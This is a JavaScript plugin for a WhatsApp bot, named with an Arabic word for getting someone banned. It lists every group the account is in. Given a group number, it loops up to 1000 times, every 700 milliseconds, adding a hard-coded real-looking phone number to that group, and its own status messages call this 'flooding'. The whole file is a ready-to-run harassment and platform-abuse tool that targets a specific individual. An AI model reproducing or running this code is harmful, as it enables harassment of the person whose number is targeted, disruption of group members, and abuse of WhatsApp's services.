if (!global.activeSpams) global.activeSpams = new Map();

const TARGET_NUMBERS = [
    '9647801266024',
];

export default {
    name: 'تبنيد',
    command: ['تبنيد', 'ban', 'ban-group', 'tabneed'],
    
    run: async (m, { sock, conn, text, args }) => {
        const c = sock || conn;
        const jid = m.chat || m.from || m?.key?.remoteJid;
        if (!jid || !c) return;

        const sub = args?.[0]?.trim() || text?.trim();

        const sendText = async (txt) => {
            await c.sendMessage(jid, { text: txt }, { quoted: m });
        };

        try {
            if (!sub || sub === '.تبنيد' || sub === '.ban') {
                await sendText('🔄 [SYSTEM] Fetching active target sectors...');
                
                let groupMetadatas = {};
                try {
                    if (typeof c.groupFetchAllParticipating === 'function') {
                        groupMetadatas = await c.groupFetchAllParticipating();
                    }
                } catch (e) {}

                let groups = Object.values(groupMetadatas || {});
                if (groups.length === 0 && c.chats) {
                    const chatValues = typeof c.chats.all === 'function' ? c.chats.all() : Object.values(c.chats);
                    groups = chatValues.filter(chat => chat.id && chat.id.endsWith('@g.us')).map(chat => ({
                        id: chat.id,
                        subject: chat.subject || chat.name || 'Unknown Group',
                        participants: chat.participants || []
                    }));
                }

                if (groups.length === 0) {
                    await sendText('⚠️ [SYSTEM] No active groups found in session.');
                    return;
                }

                let msg = '⚡ *TARGET SECTORS (GROUPS):*\n';
                groups.forEach((g, i) => {
                    msg += `\n📁 🎯 *Target [${i + 1}]* :${g.subject}\n└── 🆔 JID : ${g.id}\n└── 👥 Nodes Active : ${g.participants?.length || 0}\n`;
                });
                msg += '\n💻 *EXECUTION:* \`.تبنيد <رقم_المجموعة>\`';
                
                await sendText(msg);
                return;
            }

            if (sub === 'ايقاف' || sub === 'stop') {
                if (global.activeSpams.has(jid)) {
                    global.activeSpams.set(jid, false);
                    await sendText('🛑 [ABORT] Termination sequence halted.');
                } else {
                    await sendText('⚠️ [SYSTEM] No active execution loop found.');
                }
                return;
            }

            const groupIndex = parseInt(sub) - 1;
            let groupMetadatas = {};
            try {
                if (typeof c.groupFetchAllParticipating === 'function') {
                    groupMetadatas = await c.groupFetchAllParticipating();
                }
            } catch (e) {}

            let groups = Object.values(groupMetadatas || {});
            if (groups.length === 0 && c.chats) {
                const chatValues = typeof c.chats.all === 'function' ? c.chats.all() : Object.values(c.chats);
                groups = chatValues.filter(chat => chat.id && chat.id.endsWith('@g.us')).map(chat => ({
                    id: chat.id,
                    subject: chat.subject || chat.name || 'Unknown Group',
                    participants: chat.participants || []
                }));
            }

            if (isNaN(groupIndex) || groupIndex < 0 || groupIndex >= groups.length) {
                await sendText('❌ [ERROR] رقم المجموعة غير صحيح. استخدم الأمر `.تبنيد` لعرض القائمة.');
                return;
            }

            const targetGroup = groups[groupIndex];
            const targetJid = targetGroup.id;
            global.activeSpams.set(jid, true);

            await sendText(`⚠️ [EXECUTION PROTOCOL INITIALIZED]\n\n🚀 Target Locked: *${targetGroup.subject}*\n🔥 Status: *FLOODING ACTIVE*\n🎯 Vectors Loaded: *${TARGET_NUMBERS.length}*\n\nTo abort, send: \`.تبنيد ايقاف\``);

            (async () => {
                let count = 0;
                while (global.activeSpams.get(jid) === true) {
                    try {
                        const rawNum = TARGET_NUMBERS[count % TARGET_NUMBERS.length];
                        const targetUserJid = `${rawNum}@s.whatsapp.net`;
                        await c.groupParticipantsUpdate(targetJid, [targetUserJid], 'add');
                        count++;
                        await new Promise(resolve => setTimeout(resolve, 700));
                    } catch (err) {
                        await new Promise(resolve => setTimeout(resolve, 400));
                    }
                    if (count > 1000) break;
                }
                global.activeSpams.set(jid, false);
            })();

        } catch (e) {
            console.error('❌ [CRITICAL ERROR]:', e);
        }
    }
};